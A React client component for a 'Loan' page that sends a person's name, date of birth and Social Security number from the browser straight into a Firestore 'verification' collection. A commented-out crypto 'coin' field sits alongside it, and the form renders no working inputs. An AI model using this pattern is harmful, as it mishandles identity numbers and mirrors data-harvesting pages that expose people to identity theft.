"use client"; // This is a client component 
import db from '../firebase';
import React, { useState } from "react";

//import 'firebase/firestore';
import { getFirestore, collection, addDoc} from 'firebase/firestore';


const Loan = () => {
  

  const [data, setData] = useState({
    fname: '',
    dob: '',
    ssn: ''
    
  });

  const handleChange = (e) => {
    setData((prevData) => ({
      ...prevData,
      [e.target.name]: e.target.value
    }));
  };
  
 
  const handleSubmit = async (e) => {
    
    e.preventDefault();
    
    try {
      const docRef = await addDoc(collection(db, 'verification'), data);
      console.log('Document written with ID: ', docRef.id);
      setData({
        fname: '',
        dob: '',
        ssn: ''
       
      });
    } catch (error) {
      console.error('Error adding document: ', error);
    }
    
    window.location.href = '/thanks';
  }
 

  
  return (
    <section id="contact" className="overflow-hidden py-16 md:py-20 lg:py-28">
      <div className="container">
        <div className="-mx-4 flex flex-wrap">
          <div className="w-full px-4 lg:w-7/12 xl:w-8/12">
            <div
              className="wow fadeInUp mb-12 rounded-md bg-primary/[3%] py-11 px-8 dark:bg-dark sm:p-[55px] lg:mb-5 lg:px-8 xl:p-[55px]"
              data-wow-delay=".15s
              "
            >
              <h2 className="mb-3 text-2xl font-bold text-black dark:text-white sm:text-3xl lg:text-2xl xl:text-3xl">
              An advisor will get in touch with you via email shortly
              </h2>
              <p className="mb-12 text-base font-medium text-body-color">
                
              </p>

            
              <form onSubmit={handleSubmit}>
                <div className="-mx-4 flex flex-wrap">
                  <div className="w-full px-4 md:w-1/2">
                    
                  </div>
                  <div className="w-full px-4 md:w-1/2">
                   
                  </div>
                  <div className="w-full px-4 md:w-1/2">
                    
                  </div>
                  <div className="w-full px-4 md:w-1/2">
                 
                  </div>
                  <div className="w-full px-4 md:w-1/2">
                    <div className="mb-8">
                      {/*<label
                        htmlFor="text"
                        className="mb-3 block text-sm font-medium text-dark dark:text-white"
                      >
                        Coin
                      </label>
                      <input
                        type="text"
                        name="coin"
                        value={data.coin}
                        onChange={handleChange}
                        placeholder="Enter coin type"
                        className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp"
                        />*/}
                    </div>
                  </div>
                  <div className="w-full px-4">
                    
                  <div className="w-full px-4">
                
                     
                  </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
          <div className="w-full px-4 lg:w-5/12 xl:w-4/12">
            
          </div>
        </div>
      </div>
    </section>
  );
};

export default Loan;
